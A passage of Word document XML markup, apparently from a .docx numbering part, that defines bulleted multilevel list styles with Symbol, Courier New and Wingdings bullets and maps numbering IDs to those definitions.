        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="079AEE44">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="48569BF0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="D0BE914E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="FD484828">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="AE98AE62">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="8938A42E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="ED462E6A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="FAF8B812">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="30" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="588B0E31"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="5E4E6234">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="BB8C787A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="782A5D6A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="1D6897D0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="737027E4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="B8401BB2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C54434F4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="E66A2594">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="20000012">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="31" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="5CDE03C3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="FE7431B8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="A58A5218">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="F634E78A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="1994BB8C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="963AB834">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="12C0BA6C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="45BA56C4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="FB1CF668">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="BBC2A1F2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="32" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="5D303697"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="0FE4ED68">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="54CCAC10">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="7D7A4E56">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="CDFA6EA0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="55DEB62C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="2C16CB0E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="8CFC340E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="567C4D88">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="C2920BDC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="33" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6F4E3FCA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AD5E8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714BF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="23FA88D4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="D082AEA8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="D3F86DAC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="C29A1804">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="D7403108">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="50D45400">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="EA880028">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="635416D8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="DCB808F2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="35" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7B9D0498"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="F47840C0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="5F941680">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="8DEC0F92">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="9AD44624">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="26A84C9A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="37B6C7DC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C36A301A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="D714AC38">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="6CA800BA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="36" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7C464EE8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="BCA6DDCA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="23CCA1B4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="1B4A7074">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="704A5CEC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="2FFC5DC0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="066466A6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="823EFC92">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="FC78123A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="923ECBD0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="37" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7E2941F2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="50E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6A04EA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6390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32"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="23"/>
  </w:num>
